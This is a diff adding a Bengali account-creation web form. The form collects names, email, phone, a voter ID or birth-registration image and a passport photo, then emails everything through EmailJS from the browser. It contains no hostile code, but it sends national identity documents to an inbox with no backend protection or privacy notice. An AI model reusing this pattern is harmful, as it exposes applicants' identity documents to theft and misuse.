@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <title>অ্যাকাউন্ট তৈরি</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; background: #f5f5f5; }
+    .card { background: white; max-width: 500px; margin: 30px auto; padding: 20px; border-radius: 10px; box-shadow: 0px 2px 8px rgba(0,0,0,0.2); }
+    input, textarea { width: 95%; padding: 10px; margin: 5px 0; border: 1px solid #ccc; border-radius: 5px; }
+    button { background: #28a745; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>অ্যাকাউন্ট তৈরি ফর্ম</h2>
+    <form id="accountForm">
+      <input type="text" name="first_name" placeholder="প্রথম নাম" required>
+      <input type="text" name="last_name" placeholder="শেষ নাম" required>
+      <input type="email" name="email" placeholder="ইমেইল এড্রেস" required>
+      <input type="text" name="phone" placeholder="ফোন নাম্বার" required>
+      <label>ভোটার আইডি / জন্ম নিবন্ধন:</label>
+      <input type="file" name="nid_file" accept="image/*" required>
+      <label>পাসপোর্ট সাইজ ছবি:</label>
+      <input type="file" name="photo_file" accept="image/*" required>
+      <button type="submit">সাবমিট</button>
+    </form>
+  </div>
+
+  <script>
+    (function(){
+      emailjs.init("m8V9A-gtcFxKnDBdh"); // তোমার Public Key
+    })();
+
+    document.getElementById("accountForm").addEventListener("submit", function(e){
+      e.preventDefault();
+
+      emailjs.sendForm("service_zyz27er", "template_07gauvb", this)
+      .then(function(response) {
+        alert("✅ অ্যাকাউন্ট তথ্য পাঠানো হয়েছে!");
+      }, function(error) {
+        alert("❌ কিছু ভুল হয়েছে, আবার চেষ্টা করুন।");
+      });
+    });
+  </script>
+</body>
+</html>
